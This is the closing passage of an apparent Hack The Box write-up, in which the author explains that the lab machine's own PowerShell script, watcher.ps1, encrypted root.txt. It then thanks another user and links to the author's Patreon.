cipher.exe : Access is denied.
    + CategoryInfo          : NotSpecified: (Access is denied.:String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
Access is denied.
  Key information cannot be retrieved.

Access is denied.
```
Using the `cipher.exe` command I was indeed able to see that the file was encrypted.  The PowerShell script `watcher.ps1` that I had seen earlier in the Administrator's documents folder when I logged in was the reason.

```powershell
sleep 30
  
$file = "C:\Users\Administrator\Desktop\root.txt"
$command = "(Get-Item -Path $file).Encrypt()"

Invoke-Command -ComputerName LOCALHOST -ScriptBlock { $command }
```
The script `watcher.ps1` is the reason that root.txt was encrypted

Thanks to [`aas`](https://www.hackthebox.eu/home/users/profile/6259) for something interesting or useful about this machine.

If you like this content and would like to see more, please consider supporting me through Patreon at [https://www.patreon.com/zweilosec](https://www.patreon.com/zweilosec).
